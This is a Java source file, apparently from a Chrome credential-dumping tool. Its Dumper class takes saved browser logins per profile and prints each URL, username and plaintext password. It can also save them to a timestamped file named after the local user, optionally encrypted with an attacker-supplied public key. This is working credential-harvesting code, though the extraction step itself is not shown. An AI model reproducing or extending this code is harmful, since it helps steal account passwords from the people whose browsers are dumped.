package random.util;

import random.chrom.ChromeAccountEntry;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;

public class Dumper {

	public void saveAccountsInfoToFile(Map<String, List<ChromeAccountEntry>> profiles,
	                                   String newFiePath, String pubKeyPath) throws IOException {

		final List<String> lines = getAccountsInfo(profiles, false);

		String savePath = newFiePath != null && !newFiePath.equals("") ? newFiePath : ".";
		File file = new File(savePath + System.getProperty("file.separator"),
				Utils.getCurrentTime() + "-" + System.getProperty("user.name") + ".txt");

		if (file.exists()) {
			file.delete();
		}
		file.getParentFile().mkdirs();
		file.createNewFile();

		if (pubKeyPath != null && !pubKeyPath.isEmpty()) {
			String encoded = Encryption.encrypt(pubKeyPath, lines.toString());
			Files.write(file.toPath(), Collections.singletonList(encoded), StandardCharsets.UTF_8);
		} else {
			Files.write(file.toPath(), lines, StandardCharsets.UTF_8);
		}
	}

	public void showAccountsInfo(Map<String, List<ChromeAccountEntry>> profiles) {
		List<String> lines = getAccountsInfo(profiles, true);
		lines.forEach(System.out::println);
	}

	public List<String> getAccountsInfo(Map<String, List<ChromeAccountEntry>> profiles, boolean onlyWithNotEmptyPsw) {
		final List<String> lines = new ArrayList<>();

		for (Map.Entry<String, List<ChromeAccountEntry>> profile : profiles.entrySet()) {
			String profileName = profile.getKey();
			List<ChromeAccountEntry> profileEntries = profile.getValue();
			lines.add("==================================================");
			lines.add(profileName);
			lines.add("==================================================");
			if (profileEntries.size() > 0) {
				for (final ChromeAccountEntry account : profileEntries) {
					boolean returnInfo = onlyWithNotEmptyPsw
							? !account.getPassword().equals("")
							: !account.getURL().equals("") || !account.getUsername().equals("") || !account.getPassword().equals("");
					if (returnInfo) {
						lines.add("URL:\t\t" + account.getURL());
						lines.add("Username:\t" + account.getUsername());
						lines.add("Password:\t" + account.getPassword());
						lines.add("");
					}
				}
				lines.remove(lines.size() - 1);
			}
		}
		return lines;
	}
}
